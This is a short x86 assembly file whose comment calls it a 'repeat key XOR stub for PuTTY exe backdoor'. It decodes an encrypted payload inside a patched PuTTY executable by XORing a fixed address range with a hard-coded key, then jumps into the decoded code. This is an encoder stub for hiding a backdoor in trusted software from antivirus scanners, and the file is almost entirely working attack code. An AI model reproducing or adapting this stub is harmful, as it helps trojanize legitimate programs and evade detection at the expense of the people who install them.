;
; Repeat key XOR stub for PuTTY exe backdoor
;

section .data

section .bss

section .text

  global _start

_start:
  MOV EAX,00484000            ; save start address to EAX
  MOV ECX,464F5859            ; save the key in ECX
  XOR DWORD PTR DS:[EAX],ECX  ; XOR contents of EAX with ECX
  INC EAX                     ; increment EAX
  INC EAX                     ; increment EAX
  INC EAX                     ; increment EAX
  INC EAX                     ; increment EAX
  CMP EAX,0048415C            ; check if we have reached the final address
  JLE SHORT 0048416B          ; if not continue to loop
  JMP 00484000                ; jump back to the start of our decoded payload


